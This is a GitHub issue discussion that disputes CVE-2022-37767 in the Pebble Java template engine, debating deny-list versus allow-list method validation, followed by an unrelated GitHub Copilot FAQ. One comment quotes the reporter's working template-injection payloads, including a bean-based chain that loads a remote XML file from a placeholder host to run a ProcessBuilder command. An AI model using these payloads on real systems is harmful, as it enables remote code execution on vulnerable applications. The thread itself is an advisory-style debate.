# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

| IMHO, using deny lists is an error and pebble should switch to using allow lists instead: the end-user should be responsible of deciding which classes are safe and which are not.  [@ebussieres](https://github.com/ebussieres) WDYT? |

| Disclaimer: I'm just an occasional contributor here  [@chaitu0292](https://github.com/chaitu0292) No, this CVE is not addressed. IMHO, the blacklist approach that was picked cannot possibly cover all possible security leaks and only a whitelist approach where the user explicitly lists what's needed in his templates can work. But maybe I'm missing something.  [@rumfuddle](https://github.com/rumfuddle) Then, corporate users who depend on this library should not stay idle and wait for some open-source volunteers to tackle this issue on their free time. They should contribute, either in manpower or financially. |

| [@rumfuddle](https://github.com/rumfuddle) No it's not just an upgrade of a dependency. You need to define a MethodAccessValidator [implementation](https://github.com/PebbleTemplates/pebble/blob/master/pebble/src/main/java/com/mitchellbosecke/pebble/attributes/methodaccess/MethodAccessValidator.java)  Then If you use pebble-spring:   * Define a bean which implements `MethodAccessValidator`  ```     @Bean     public MethodAccessValidator methodAccessValidator() {       return new BlacklistMethodAccessValidator(); //Provide your custom implementation     }  ```  If not   * override the default MethodAccessValidator in PebbleEngine  ```   new PebbleEngine.Builder()             .methodAccessValidator(new BlacklistMethodAccessValidator()) //Provide your custom implementation             .build();  ```  The complexity resides in the implementation. If we provide a WhitelistMethodAccessValidator, we'll need to whitelist a lot of things (jdk, spring etc.). See this [comment](https://github.com/PebbleTemplates/pebble/pull/494#issuecomment-629691422)  I'm all ears open for suggestions |

| we'll need to whitelist a lot of things (jdk, spring etc.)  jdk  Indeed, core classes and Java collections are often used in pebble templates.  spring  This I don't get, sorry. Why should it be possible for a user to have access **by default** to Spring core classes in his pebble templates? [@ebussieres](https://github.com/ebussieres) Could you please elaborate?  My2cents:  It's possible to harden a default configuration for a known subset of classes, typically the JDK. It's not possible for frameworks such as Spring.  Pebble can provide a sensible default configuration that grants access to all `java.lang` and `java.util` packages, with a few exceptions like `Thread` and `getClass` like it's currently implemented that would have higher priority.  For all other classes and methods, the user would have to explicitly list what he wants to enable, typically his POJOs and utils.  [@ebussieres](https://github.com/ebussieres) WDYT? |

| My apologies for my earlier comment. I only now found the time to look at the issue (I got it confused with a Apache commons vulnerability), and I can see the complexity. For my use case, whitelisting whereby the default whitelist is even empty and the user is required to add "everything" would unblock us but I also appreciate the fact that you need to consider backwards compatibility with the current implementation. And the opposite, blacklisting would not make the CVE go away I guess. |

| And the opposite, blacklisting would not make the CVE go away I guess.  Exactly.  Then, please remember that CVE severity is only determined based on the potential impact if someone was able to exploit it. It doesn't provide any context about the conditions for being able to exploit it. In this case, the only way to exploit is that the templates are generated from an untrusted source, eg having a system that publishes templates in a directory and have the Spring application load them from the filesystem. If your templates are shipped with your application code by your developers, your developers can't do more harm this way than what they can already do with malicious code in their Java code. |

| In our use case, templates are 'data', provided by endusers but at least endusers that have to authenticate and that we trust. So I'm not that worried about exploits. Bigger problem is Nexus. The CVE is level critical, so we cannot perform any build&deploys until this is fixed. |

| Is there any chance this gets resolved any time soon? I am also willing to contribute. As [@rumfuddle](https://github.com/rumfuddle) mentioned, it breaks any corporate build.  To me **this vulnerability would only exhibit itself in scenarios in which the application accepts the input and then directly evaluates it as the template** which is a horribly bad practice.  In the most common case when the templates are managed by the development team the chance of doing any harm is really low. Why would anyone want to execute code from the hand-crafted developer managed template if one could do the same system call directly from the Java code itself. |

| [@slandelle](https://github.com/slandelle) [@ebussieres](https://github.com/ebussieres) I am willing to contribute on behalf of myself or the organization that I am part of if I know that the PR/solution will be accepted into the master.  I suggest to create a `DefaultMethodAccessValidator` or `StrictMethodAccessValidator` that will be active as the default MethodAccessValidator, allowing the template developers to read the properties of the of the template variables `ONLY`.  The user will still be able to configure a backward compatible `BlacklistMethodAccessValidator` either programatically or by setting appropriate Spring Boot starter property.  This should work flawlessly for users who use the view model approach, users who need to execute custom code from the templates will be able to set back the "old" `BlacklistMethodAccessValidator`. This should solve the CVE.  Please let me know what you think. |

In previous versions, in order to mitigate command execution caused by malicious content in the template，pebble introduces a new security mechanism, which is implemented through the class BlacklistMethodAccessValidator.  In this class you can see a lot of restrictions, on the one hand, restricting the class to be an instance of certain classes, and on the other hand, restricting the execution of some methods  ``` public class BlacklistMethodAccessValidator implements MethodAccessValidator {     private static final String[] FORBIDDEN_METHODS = new String[]{"getClass", "wait", "notify", "notifyAll"};      public BlacklistMethodAccessValidator() {     }      public boolean isMethodAccessAllowed(Object object, Method method) {         boolean methodForbidden = object instanceof Class || object instanceof Runtime || object instanceof Thread || object instanceof ThreadGroup || object instanceof System || object instanceof AccessibleObject || this.isUnsafeMethod(method);         return !methodForbidden;     }      private boolean isUnsafeMethod(Method member) {         return this.isAnyOfMethods(member, FORBIDDEN_METHODS);     }      private boolean isAnyOfMethods(Method member, String... methods) {         String[] var3 = methods;         int var4 = methods.length;          for(int var5 = 0; var5 < var4; ++var5) {             String method = var3[var5];             if (this.isMethodWithName(member, method)) {                 return true;             }         }          return false;     }      private boolean isMethodWithName(Method member, String method) {         return member.getName().equals(method);     } } ```  Look at the old version of exploit, loading any class by Class.forName，now，no class  ``` {% set cmd = 'id' %} {% set bytes = (1).TYPE      .forName('java.lang.Runtime')      .methods[6]      .invoke(null,null)      .exec(cmd) %}  ```  What can we do? So far we know that many instances of Spring applications are implicitly registered as beans, so can we find an object from a bean that holds a classloader object, and by getting it we can load any object by executing loadClass  By debugging we can easily export these beans objects  [182612181-b21c98e1-b586-4c02-a0b6-d8c863a76a22](https://user-images.githubusercontent.com/849197/196399256-87e78dd1-276a-40ad-abab-63ada5a180d6.png)  So we have to find some eligible beans among

fit the criteria and it helped us get the classloader object  [182612219-ec75b2f6-77b1-43cd-ab16-4f459aeba184](https://user-images.githubusercontent.com/849197/196399451-420e334a-66f6-4e1b-94f4-e0559e3d6c3e.png)  It is not enough to execute loadclass, we also need to instantiate the class. And It's also very simple, there is jackson among spring's dependencies, through jackson deserialization we can easily instantiate a class.  Fortunately there is this jacksonObjectMapper object in the beans.Now we can instantiate arbitrary classes, and by being able to instantiate arbitrary classes we have bypassed the filtering restrictions  In the spring scenario we can easily think of a configuration class org.springframework.context.support.ClassPathXmlApplicationContext, which allows us to load a remote xml configuration file, through which we can easily implement the command execution.  But...  At this point you will find that any class jackson that inherits from AbstractPointcutAdvisor and AbstractApplicationContext will not be allowed to instantiate  ```     public void validateSubType(DeserializationContext ctxt, JavaType type, BeanDescription beanDesc) throws JsonMappingException {         Class<?> raw = type.getRawClass();         String full = raw.getName();         if (!this._cfgIllegalClassNames.contains(full)) {             if (raw.isInterface()) {                 return;             }              if (full.startsWith("org.springframework.")) {                 Class cls = raw;                  while(true) {                     if (cls == null || cls == Object.class) {                         return;                     }                      String name = cls.getSimpleName();                     if ("AbstractPointcutAdvisor".equals(name) || "AbstractApplicationContext".equals(name)) {                         break;                     }                      cls = cls.getSuperclass();                 }             } else if (!full.startsWith("com.mchange.v2.c3p0.") || !full.endsWith("DataSource")) {                 return;             }         }          ctxt.reportBadTypeDefinition(beanDesc, "Illegal type (%s) to deserialize: prevented for security reasons", new Object[]{full});     } ```  What to do at this time? We found a class called java.beans.Beans in jre.  The instantiate method of this class can help us instantiate arbitrary methods.  ``` public static Object instantiate(ClassLoader cls, String beanName) throws IOException, ClassNotFoundException {   return Beans.instantiate(cls, beanName, null, null); } ```  Here the classloader parameter is allowed to be set to empty, if it is empty later will be through the ClassLoader.getSystemClassLoader (); get, of course, in fact, we also get a classloader at the top which is not the point，It will eventually return an instantiated object based on the beanName passed in.  ``` if (result == null) {   // No serialized object, try just instantiating the class   Class<?> cl;    try {     cl = ClassFinder.findClass(beanName, cls);   } catch (ClassNotFoundException ex) {     // There is no appropriate class.  If we earlier tried to     // deserialize an object and got an IO exception, throw that,     // otherwise rethrow the ClassNotFoundException.     if (serex != null) {       throw serex;     }     throw ex;   }    if (!Modifier.isPublic(cl.getModifiers())) {     throw new ClassNotFoundException("" + cl + " : no public access");   }    /*              * Try to instantiate the class.              */    try {     result = cl.newInstance();   } catch (Exception ex) {     // We have to remap the exception to one in our signature.     // But we pass extra information in the detail message.     throw new ClassNotFoundException("" + cl + " : " + ex, ex);   } } ```  So we get the ClassPathXmlApplicationContext class that was forbidden to be instantiated by indirect means.  So by stringing these points together we can easily get the following payload  ``` {% set y= beans.get("org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory").resourceLoader.classLoader.loadClass("java.beans.Beans") %} {% set yy =  beans.get("jacksonObjectMapper").readValue("{}", y) %} {% set yyy = yy.instantiate(null,"org.springframework.context.support.ClassPathXmlApplicationContext") %} {{ yyy.setConfigLocation("http://xxx.xxx.xxx/1.xml") }} {{ yyy.refresh() }}  ```  1.xml  ``` <?xml version="1.0" encoding="UTF-8" ?>     <beans xmlns="http://www.springframework.org/schema/beans"        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"        xsi:schemaLocation="      http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">         <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">             <constructor-arg >             <list>                 <value>open</value>                 <value>-a</value>                 <value>calculator</value>             </list>             </constructor-arg>         </bean>     </beans> ```  with http server in your vps  ``` python3 -m http.server 80  ```  Successfully triggered command execution by template file called rce.pebble  [182613215-94d98d05-3f5c-4dee-87e4-445dd60c2d2c](https://user-images.githubusercontent.com/849197/196399964-0116ba0f-7e4e-4abb-bf75-28ea2ed13491.png) |

| After reviewing the report [Y4tacker/Web-Security#3](https://github.com/Y4tacker/Web-Security/issues/3) I **STRONGLY** disagree with calling this a Pebble vulnerability. TLTR:  * there must be a badly designed controller allowing the user to load arbitrary template from the classpath * the classpath template must intentionally be designed contain malicious code * **Pebble properly handles and escapes any rendered input variable**  The long story:1. Bad controller design The first problem is in the design of the Spring MVC controller - there is no input validation and the `@RequestParam String template` is being directly used as a template name.  This weakness can be exploited to load and render any classpath resource as a template and it would be a real problem no matter what templating engine is being used. In case of Pebble the list of resources that are eligible to be be loaded is being limited by `pebble.prefix` and `pebble.suffix` files.  On top of being fairy insecure, this approach is likely to cause tons HTTP 500 errors for situations like:   * the mismatched template names (example `you-cant-find-me-on-classpath`) * when trying to load templates that expect certain variables (example: `partials/top`)  ``` package com.example.hackingpebble.controller;  import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam;  @Controller public class Test {      @RequestMapping({"/"})     public String getTemplate(@RequestParam String template) {         // Can be used arbitrary file from the classpath LOL         return template;     }  } ``` 2. Malicous code in the template The second problem is in how the reporter designed `resources/template/rce.pebble` template:  ``` {% set cmd = 'id' %} {% set bytes = (1).TYPE      .forName('java.lang.Runtime')      .methods[6]      .invoke(null,null)      .exec(cmd) %}  ```  This template code is not coming from the user input but is **already present on the classpath**.  Why would a developer try to write a malicious code and hide it in a template if one could simply write a malicious code directly in the Java source? 4. MethodAccessValidator `BlacklistMethodAccessValidator` might not even be there, it is not used in the input validation. For systems that control the template contents (or store them locally on the classpath), as far as I understand, `MethodAccessValidator` is to prevent developers from hurting themself (locking the threads or consuming system resources). 3. Conclusion Calling this a CVE is like saying that knives are dangerous because they can be misused. [CVE-2022-37767](https://github.com/advisories/GHSA-wxx5-w9jc-48wx "CVE-2022-37767") is unlikely to exhibit itself in any application that controls own template contents.  Please consider my previous comment [#625 (comment)](https://github.com/PebbleTemplates/pebble/issues/625#issuecomment-1281187930) as a potential improvement (but not as a *security fix*). |

| [@piotrpolak](https://github.com/piotrpolak) From my understanding:   * Some people design applications where end-users can edit the Pebble templates directly in production, eg served from the database or the filesystem. * CVE risk levels are only based on the possible impact if someone manages to exploit it, not based on the feasibility of exploiting it. See log4j and he LDAP stuff as an example. Here, the impact would be remote code execution, hence the highest possible severity.   I agree that sanitizing the end-user input is the application's responsibility. I also agree that with this kind of reasoning, having a door in your house is a critical vulnerability because you could get robbed if you were to leave it wide open...  But now, it seems that nowadays infosec is all about configuring some dependency scanning SaaS product that's going to report every library matching a CVE in the NVD, whatever the usage context. For example, they force me to upgrade moment.js in a static local files generator because of an issue when used with node.js.  Now, I have no idea how this ended up in the NVD, in particular as AFAIK no one reached out the Pebble community to validate it, and so how to revisit the registired CVE. |

| [@slandelle](https://github.com/slandelle)  * Some people design applications where end-users can edit the Pebble templates directly in production, eg served from the database or the filesystem.  Allowing the user to edit templates without proper input validation is a security issue by itself as one might intentionally (or unintentionally) save a code exposing a Cross-Site-Scripting (XSS) vulnerability on top of the RCE one.  If we take this approach, we should consider the entire JavaScript as super insecure as it exposes the ‘eval’ function and one might write an application that reads data from the untrusted database/filesystem and executes the malicious code.  You might still want to change the behavior of Pebble’s default ‘MethodAccessValidatior’ to allow methods on the submitted view model (template variables) only. This would include getters, collection methods but would disallow calling any bean’s or system methods. In other words developers would rather have to push variables to the templates rather than pulling them from the template level by executing bean/system methods. You could still leave the ‘BlacklistMethodAccessValidator’ in the project for these who need it for backward compatibility reasons but it would require manual configuration either from code or the properties file. This should solve the mysterious CVE but could introduce a backward incompatible change for these relying on the system calls executed from the templates.  In case of the applications that I take care of, I consider calling bean methods from the template code a bad practice when you have the neat view model approach. Calling Java methods from the template in both potentially dangerous, hard to test and prone to refactoring related errors. I can still imagine that one might need to call individual bean’s methods from the user managed templates but I consider it as a corner case. To me it sounds like programming-trough-the-template approach.  The CVE is not relevant to my application but it makes the Pebble library appear as an extreme risk in the security scan report.  If you agree to change the behavior of the default ‘MethodAccessValidator’ - I am willing to help. |

| This would include getters, collection methods but would disallow calling any bean’s or system methods.  Technically, how do you implement those categories?  A getter is only a convention. Is `getClass` or `getClassLoader` a getter? In Java, collections are not isolated, they sit in the `java.util` package, along with you also have things like `TimerThread`. You probably want to be able to do a substring on a String, or get its length. But in Java, all base types live in the `java.lang` package, where you also have things like `Thread`, `System` and `Runtime`.  It's actually very complicated.  In other words developers would rather have to push variables to the templates rather than pulling them from the template level by executing bean/system methods.  What about POJO trees or collections traversal: `foo.bar.baz`?  I consider calling bean methods from the template code a bad practice when you have the neat view model approach  What about static helpers, eg for formatting? This is a view concern so using those here is legit.  The CVE is not relevant to my application but it makes the Pebble library appear as an extreme risk in the security scan report.  In the end, a template is just a piece of the program. It doesn't look to me that Pebble is any less secure than Java itself. IMO, this CVE is not relevant. And neither is the previous one that resulted in introducing MethodAccessValidator.  If you agree to change the behavior of the default ‘MethodAccessValidator’ - I am willing to help.  Ha ha, there's a misunderstanding here :) I'm not a committer here, just a mere occasional contributor. I raised my voice in this ticket because we use Pebble in Gatling.  I'm willing to lend a hand but the owner here is [@ebussieres](https://github.com/ebussieres) and I absolutely don't have the bandwidth to become a core committer here. |

| FYI, I've requested the invalidation of the CVE. Here's the message I posted on the [MITRE form](https://cveform.mitre.org/):  ``` Hi,  I'm a contributor on the PebbleTemplate open-source project. Some time ago, a CVE against this library was created. The reporter is unknown and the PebbleTemplate authors and community were not consulted in the process, in particular to check that the CVE was valid.  The report is based on an issue on an external GitHub bug tracker (https://github.com/Y4tacker/Web-Security/issues/3) which is now private, resulting in the link in the CVE description now being broken. I've managed to retrieve its content and copy it here: https://github.com/PebbleTemplates/pebble/issues/625#issuecomment-1282138635.  We've discussed this CVE with other users of this library and we strongly disagree with it.  The Pebble templating engine is to be embedded in Java applications and developers can code in the templates what they could code directly in the Java part of their application, like with Java Server Pages (JSP). In this sense, Pebble is not less secure than Java itself. If some developers decide to implement a feature to let their application consume templates provided by the end users, it's their responsibility to properly sanitize user input, just like one would protect against SQL injection. It's not the responsibility of the library.  As a result, I humbly request that you invalidate this CVE.  Best regards,  Stéphane Landelle  ``` |

| Not a contributor, not even a major user, but I came across this in my normal Gradle buildscript upgrade where I noticed that, yet again, my HTTP framework was including something with a vulnerability.  I disagree with the CVE and CVSS. That being said, there is some inconsistency which could lead to a "security issue."  Templates, pebble or not, are arbitrary code. They should be highly sanitized. Any failure to do so is the applications fault. In fact, that is my major gripe with the CVSS: this is **NOT** a remote vulnerability.  That being said, this does seem to be a bypass to existing mechanism of security: the blacklist. I don't use Spring Boot so I may be wrong in this front. Additionally, I do recognize that ensuring the blacklist cannot be bypassed is practically, if not literally, impossible, but the library's dependencies should not expose this issue by default.  I would suggest allowing a whitelist to be selected (if possible in a backwards compatible manner) or at the very minimum sanitizing the library's dependencies for bypass vulnerabilities. This ensures that the blacklist feature works as the user may expect (minus the obvious oversights users *should* expect from a default blacklist.)  In the meantime, I am yet again going to ignore the big yellow highlighting and tell Snyk it needs to calm down. |

| Hi all. One of our dev/test pipelines is blocked by this CVE. Our specific use case is running Gradle Gatling for load tests. This has Pebble as a dependency. From the helpful comments here I am understanding this disputed CVE as  "If Pebble is configured to read a template (or classpath location?) from a location that is under control of a malicious actor, the malicious actor could introduce malicious code which would be executed"? Is that fair?  In which case isn't it the same as using an insecure writeable public repo, or hosting your templates on a public writeable S3 bucket? Am I missing something? Other than this kind of egregious failure of source code security, is there any way someone could use this CVE for an attack?  Also - is there any progress on the proposed mitigations (Whitelist mode)? |

| Note: Gatling creator here.  Is that fair?  yes  In which case isn't it the same as using an insecure writeable public repo, or hosting your templates on a public writeable S3 bucket?  It is exactly this.  is there any way someone could use this CVE for an attack?  None I can think of.  Also - is there any progress on the proposed mitigations (Whitelist mode)?  I don’t think so. And it's probably a huge undertaking (similar to the official SecurityManager that has been deprecated for removal).  I tried to reach out to the organization maintaining the CVE database to try to get this CVE reconsidered but they never bothered replying. IMO, you should tune your vulnerability scanning tool to make this CVE a false positive. |

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

